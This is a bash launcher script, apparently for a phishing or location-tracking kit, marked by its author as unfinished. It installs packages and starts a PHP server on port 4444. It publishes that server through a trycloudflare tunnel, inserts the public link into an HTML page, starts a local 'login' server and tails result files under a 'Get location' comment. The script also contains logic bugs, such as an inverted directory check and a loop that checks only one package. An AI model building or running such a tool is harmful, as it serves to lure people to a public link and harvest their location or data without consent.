#!/usr/bin/env bash #uncomment in linux environment!
#<<<========Inbuilt Varialbles and values========>>>
CWD=$(pwd)
OS=$(uname -o)
if [[ ${OS,,} == *'android'* ]]; then
    if [[ ${CWD} == *'com.termux'* ]]; then
        export PREFIX='/data/data/com.termux/files/usr'
        INS() {
            apt install $1 -y
        }
        if ! hash termux-chroot >/dev/null 2>&1; then
            apt install proot -y >/dev/null 2>&1 | printf "\033[32mInstalling:: package: proot\033[00m\n"
        fi
    else
        printf "\033[32m[\033[31m!\033[32m] \033[34mYou are using unknown softarware! you may edit this script to run it on your software!\033[00m\n"
        exit 1
    fi
elif [[ ${OS,,} == *'linux'* ]]; then
    export PREFIX='/usr'
    INS() {
        sudo apt install $1 -y
    }
else
    printf "\033[32m[\033[31m!\033[32m] \033[34mYou are using unknown softarware! you may edit this script to run it on your software!\033[00m\n"
    exit 1
fi
#<<<========Color Code========>>>
S0="\033[1;30m" B0="\033[1;40m"
S1="\033[1;31m" B1="\033[1;41m"
S2="\033[1;32m" B2="\033[1;42m"
S3="\033[1;33m" B3="\033[1;43m"
S4="\033[1;34m" B4="\033[1;44m"
S5="\033[1;35m" B5="\033[1;45m"
S6="\033[1;36m" B6="\033[1;46m"
S7="\033[1;37m" B7="\033[1;47m"
R0="\033[0;00m"
#<<<=========Requrements=====>>>
pkgs=(git wget curl php jq)
for p in "${pkgs}"; do
    if ! hash ${p} >/dev/null 2>&1; then
        printf "${S4}Package${S1}: ${S2}${p} not found! ${S1}::${S2} Installing.....${R0}\n"
        INS "${p}" >/dev/null 2>&1
    fi
    if ! hash gpg > /dev/null 2>&1; then
        INS gnupg > /dev/null 2>&1
    fi
done
#<<<=========Program=========>>>
#lets tests for login page lol this program is in process not completed!! so dont use now
if [ -d $CWD/logs ]; then
    mkdir logs > /dev/null 2>&1
else
    rm -rf $CWD/logs/phpLogs.txt $CWD/logs/phpSend.txt $CWD/logs/cloudflare-log.txt >/dev/null 2>&1
fi
killall php cloudflared >/dev/null 2>&1
cd $CWD/assets/send >/dev/null 2>&1
php -S 127.0.0.1:4444 >> $CWD/logs/phpSend.txt &
sleep 4
if [[ ${OS,,} == *'android'* ]]; then
    termux-chroot cloudflared -url 127.0.0.1:4444 --logfile ${CWD}/logs/cloudflare-log.txt > /dev/null 2>&1 &
else
    cloudflared -url 127.0.0.1:4444 --logfile ${CWD}/logs/cloudflare-log.txt > /dev/null 2>&1 &
fi
sleep 7
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${CWD}/logs/cloudflare-log.txt")
#<<<===listner====>>>#
cd $CWD/assets >/dev/null 2>&1
#replace link in output html
while read -r X; do
    echo ${X//pre/$link}
done < $CWD/assets/serverDummy > $CWD/assets/server.html
#start web login
php -S 127.0.0.1:8084 >> $CWD/logs/phpLogin.txt &
printf "\n${S2}[${S5}+${S2}] ${S4}Login servet started at ${S1}:: ${S2}http://127.0.0.1:8084 ${R0}\n"
xdg-open http://127.0.0.1:8084
#<<<---Get location--->>>#
tail -f $CWD/assets/send/php/info.txt $CWD/assets/send/php/result.txt